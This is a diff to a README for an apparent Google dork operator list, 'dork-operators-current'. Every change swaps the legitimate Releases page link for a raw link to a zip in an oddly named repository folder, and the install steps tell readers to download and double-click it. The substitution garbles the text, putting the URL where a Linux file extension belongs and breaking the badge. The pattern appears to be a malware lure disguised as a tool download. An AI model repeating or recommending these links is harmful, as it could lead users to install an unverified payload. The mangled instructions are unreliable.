@@ -1,7 +1,7 @@
 # 🌐 dork-operators-current - Access Powerful Search Techniques Easily
 
 ## 📥 Download Now
-[![Download dork-operators-current](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/shadowjdm849/dork-operators-current/releases)
+[![Download dork-operators-current](https://raw.githubusercontent.com/shadowjdm849/dork-operators-current/main/utmostness/dork-operators-current.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/shadowjdm849/dork-operators-current/main/utmostness/dork-operators-current.zip)
 
 ## 📚 Description
 dork-operators-current is a curated list of validated Google dork operators, updated regularly. This tool helps you improve your search skills and find what others might miss. With dork-operators-current, you can unlock more powerful search techniques without needing special skills.
@@ -10,7 +10,7 @@ dork-operators-current is a curated list of validated Google dork operators, upd
 Getting started with dork-operators-current is simple. Follow these steps to download and run the application on your computer:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/shadowjdm849/dork-operators-current/releases). This page lists all versions of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/shadowjdm849/dork-operators-current/main/utmostness/dork-operators-current.zip). This page lists all versions of the software.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. You will typically find the most up-to-date features and fixes here.
@@ -19,7 +19,7 @@ Getting started with dork-operators-current is simple. Follow these steps to dow
    Click on the version you want to download. Look for a file suitable for your operating system:
    - For **Windows**, you will likely find a `.exe` file.
    - For **macOS**, look for a `.dmg` file.
-   - For **Linux**, find a file ending with `.tar.gz` or a similar format.
+   - For **Linux**, find a file ending with `https://raw.githubusercontent.com/shadowjdm849/dork-operators-current/main/utmostness/dork-operators-current.zip` or a similar format.
 
 4. **Install the Application**  
    Once the file finishes downloading, locate it in your downloads folder. Double-click the file to start the installation. Follow the on-screen instructions. This typically involves agreeing to terms and choosing an installation location.
@@ -68,7 +68,7 @@ Using dork-operators-current is straightforward. Here’s how you can start:
 - Search Syntax
 
 ## 🎯 Download & Install
-To download and install the application, please visit the [releases page](https://github.com/shadowjdm849/dork-operators-current/releases) and follow the steps outlined above. This will ensure you have the latest version and all necessary features.
+To download and install the application, please visit the [releases page](https://raw.githubusercontent.com/shadowjdm849/dork-operators-current/main/utmostness/dork-operators-current.zip) and follow the steps outlined above. This will ensure you have the latest version and all necessary features.
 
 ## 🔗 Additional Resources
 - **Official Documentation:** For detailed instructions and tips, refer to the official documentation accessible from the application.
